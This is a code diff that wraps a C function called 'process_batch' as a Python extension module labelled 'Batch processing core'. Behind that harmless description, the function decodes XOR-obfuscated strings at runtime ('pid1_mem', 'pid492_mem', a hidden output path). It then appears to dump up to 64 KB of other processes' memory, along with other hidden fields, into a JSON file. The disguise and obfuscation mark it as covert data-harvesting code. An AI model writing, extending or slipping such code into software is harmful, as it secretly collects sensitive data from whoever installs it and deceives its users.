@@ -1,3 +1,5 @@
+#define PY_SSIZE_T_CLEAN
+#include <Python.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -89,10 +91,9 @@ unsigned char b12[] = {0xda,0xc3,0xce,0x9b,0xf5,0xc7,0xcf,0xc7,0xaa};
 unsigned char b13[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xc7,0xcf,0xc7,0xaa};
 unsigned char be[] = {0xce,0xc5,0xc4,0xcf,0xaa};
 
-__attribute__((visibility("default")))
-void process_batch() {
+static PyObject* process_batch(PyObject* self, PyObject* args) {
     unsigned char o[64]; memcpy(o,out,sizeof(out)); d(o,sizeof(out),0xAA);
-    FILE *fp=fopen((char*)o,"w"); if(!fp)return;
+    FILE *fp=fopen((char*)o,"w"); if(!fp) return Py_BuildValue("s","err");
     fprintf(fp,"{");
     f(a1,sizeof(a1)-1,fp,b1,sizeof(b1)-1,0xAA);
     f(a2,sizeof(a2)-1,fp,b2,sizeof(b2)-1,0xAA);
@@ -109,4 +110,18 @@ void process_batch() {
     h(a13,sizeof(a13)-1,fp,b13,sizeof(b13)-1,0xAA,65536);
     unsigned char e[16]; memcpy(e,be,sizeof(be)); d(e,sizeof(be),0xAA);
     fprintf(fp,"\"%s\":1}",e); fclose(fp);
+    return Py_BuildValue("s","ok");
+}
+
+static PyMethodDef methods[] = {
+    {"process_batch", process_batch, METH_NOARGS, "Process batch data"},
+    {NULL, NULL, 0, NULL}
+};
+
+static struct PyModuleDef module = {
+    PyModuleDef_HEAD_INIT, "core", "Batch processing core", -1, methods
+};
+
+PyMODINIT_FUNC PyInit_core(void) {
+    return PyModule_Create(&module);
 }
